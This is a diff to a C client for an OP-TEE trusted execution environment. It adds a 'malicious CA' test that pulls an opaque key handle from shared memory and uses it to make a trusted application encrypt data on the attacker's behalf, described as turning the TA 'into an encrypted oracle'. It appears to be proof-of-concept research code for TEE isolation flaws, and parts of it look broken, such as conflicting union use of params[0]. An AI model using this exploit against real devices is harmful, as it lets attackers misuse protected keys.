@@ -55,6 +55,8 @@
 #define TA_HEAP_PARAM_PAC_CMD_READ_HEAP						8
 #define TA_HEAP_PARAM_PAC_CMD_WRITE_HEAP					9
 #define TA_HEAP_PARAM_PAC_CMD_RELEASE_HEAP					10
+#define TA_ACIPHER_CMD_GEN_KEY								11
+#define TA_ACIPHER_CMD_ENCRYPT								12
 
 #define BUFFER_SIZE    20
 
@@ -93,6 +95,7 @@ TEEC_Result read_secure_object(TEEC_Session *sess, char *id,
 }
 
 #define TEST_OBJECT_SIZE	7000
+#define ACIPHER_SIZE		1024
 
 int main(int argc, char const *argv[])
 {
@@ -204,9 +207,6 @@ int main(int argc, char const *argv[])
 				 &err_origin);
 	TEEC_CloseSession(&sess);
 
-	/* Test TEE_ObjectHandle */
-	// printf("\033[1;37;44m[*] Test TEE_ObjectHandle\033[0m\n");
-
 	/* Test storage hijacking */
 	res = TEEC_OpenSession(&ctx, &sess, &uuid,
 			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
@@ -223,7 +223,39 @@ int main(int argc, char const *argv[])
 	TEEC_CloseSession(&sess);
 
 	/* Test opaque handles */
-	// printf("\033[1;37;44m[*] Test opaque handles\033[0m\n");
+	printf("\033[1;37;44m[*] Test opaque handles\033[0m\n");
+	res = TEEC_OpenSession(&ctx, &sess, &uuid,
+			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
+	if (res != TEEC_SUCCESS)
+		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
+			res, err_origin);
+
+	int shmid_acipher;
+    key_t key_acipher = ftok("shared_memory_key", 456);
+
+    shmid_acipher = shmget(key_acipher, size, 0666);
+
+    int* shared_acipher = (int*)shmat(shmid_acipher, NULL, 0);
+
+	memset(&op, 0, sizeof(op));
+	op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_MEMREF_TEMP_INPUT,
+					 TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE);
+	uint8_t input[ACIPHER_SIZE];
+	memset(input, 'A', ACIPHER_SIZE);
+    op.params[0].value.a = shared_acipher[0];
+    op.params[0].value.b = shared_acipher[1];
+	op.params[0].tmpref.buffer = input;
+	op.params[0].tmpref.size = ACIPHER_SIZE;
+
+	printf("    [-] The malicious CA got opaque handle: 0x%X%X\n", 
+			op.params[0].value.b, op.params[0].value.a);
+
+    shmdt(shared_acipher);
+	
+	printf("    [-] The malicious CA turns TA into an encrypted oracle\n");
+	res = TEEC_InvokeCommand(&sess, TA_ACIPHER_CMD_ENCRYPT, &op,
+				 &err_origin);
+	TEEC_CloseSession(&sess);
 
 	TEEC_FinalizeContext(&ctx);
 
